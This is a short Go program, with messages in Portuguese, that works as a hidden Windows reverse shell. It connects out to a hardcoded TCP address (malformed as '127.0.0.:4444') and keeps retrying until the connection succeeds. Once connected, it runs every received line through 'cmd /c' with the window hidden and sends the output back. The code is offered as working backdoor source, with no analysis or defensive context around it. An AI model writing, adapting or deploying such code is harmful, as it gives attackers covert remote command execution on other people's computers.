package main

import(
	"fmt"
	"net"
	"bufio"
	"os/exec"
	"syscall"
)

var(
	ip_port = "127.0.0.:4444"
)

func main(){
	cnn:
	co, error := net.Dial("tcp",ip_port)
	if error != nil{
		fmt.Printf("%v\r","não conecto")
		goto cnn
	} else{
		fmt.Println("conecto")
		for{
			at, _ := bufio.NewReader(co).ReadString('\n')
			shell := exec.Command("cmd", "/c", at)
			shell.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			saida, _ := shell.CombinedOutput()
			co.Write(saida)
		}
	}
}
